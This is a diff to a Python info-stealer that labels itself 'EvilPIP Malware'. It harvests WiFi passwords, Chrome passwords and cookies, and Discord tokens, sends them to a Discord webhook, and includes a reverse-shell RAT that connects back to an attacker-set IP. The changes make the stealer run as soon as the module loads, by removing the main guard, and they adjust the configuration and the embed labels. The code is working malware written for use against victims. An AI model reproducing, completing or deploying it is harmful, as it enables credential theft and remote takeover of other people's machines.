@@ -4,6 +4,7 @@
 MODULES THAT NEED TO BE INSTALLED:
     - pypiwin32
     - pycryptodome
+    - uuid
 """
 
 import re, os, time, shutil, sqlite3, base64, json, sys, string
@@ -22,11 +23,15 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 
 class VARIABLES:
-    webhook   = "" # your discord webhook
-    REVSHELL  = True # true = try to connect to reverse shell, false = dont
-    serverip  = "192.168.1.1" # your server/host ip
-    buffer    = 1024 # buffer (in bytes) to send each message
-    port      = 80 # port for victim to connect to
+    webhook    = "" # your discord webhook
+    printOnEnd = False # True = don't print endText when program finished - False = don't print
+    endText    = "PROGRAM FINISHED" # change this to whatever you want to print when the program finishes
+
+    """ If you don't have any clue what you're doing - keep REVSHELL False """
+    REVSHELL  = False # False = dont connect to your shell - True = try to connect to your shell
+    serverip  = "YOUR-IP" # your server/host ip for victim to connect to 
+    buffer    = 1024 # buffer to send (in bytes) each packet
+    port      = 80 # server port to connect to
 
 class EVIL:
     """ EvilPIP Malware """
@@ -325,6 +330,7 @@ class EVIL:
 
         def Main(self):
             """ Get information and construct embed """
+            """ Current error: token validation not working """
             WifiPass   = self.GetWifiPasswords()
             ChromePass = self.GetChromePasswords()
             ChromeCks  = self.GetChromeCookies()
@@ -336,7 +342,6 @@ class EVIL:
 
             working, bad = "", ""
             for token in discord_tokens[1]:
-                print(token)
                 if DiscTokens.Valid(token): working += f"{token}\n"
                 else: bad += f"{token}\n"
 
@@ -348,11 +353,11 @@ class EVIL:
                 "color": 0x000000,
                         "fields": [
                             {
-                                "name": "**Valid Tokens**",
+                                "name": "**Valid Tokens (current)**",
                                 "value": f"```{'No Valid Tokens :(' if working == '' else working}```"
                             },
                             {
-                                "name": "**Invalid Tokens**",
+                                "name": "**Invalid Tokens (old)**",
                                 "value": f"```{'No Invalid Tokens :)' if bad == '' else bad}```"
                             },
                             {
@@ -388,7 +393,7 @@ class EVIL:
 
 
     class NETWORK:
-        """ RAT/Reverse Shell - Isn't very good ATM"""
+        """ RAT/Reverse Shell (Isn't very good ATM)"""
         def __init__(self):
             self.ip = get("https://icanhazip.com").text.split("\n")[0]
             self.cwd = os.getcwd()
@@ -437,8 +442,7 @@ class EVIL:
                     s.send("[!] Error on client side!".encode())
             s.close()
 
-
-if __name__ == '__main__':
-    PROGRAM = EVIL()
-    LOGGER  = PROGRAM.LOGGER()
-    LOGGER.Main()
+PROGRAM = EVIL()
+LOGGER  = PROGRAM.LOGGER()
+LOGGER.Main()
+print(VARIABLES.endText if VARIABLES.printOnEnd else "")
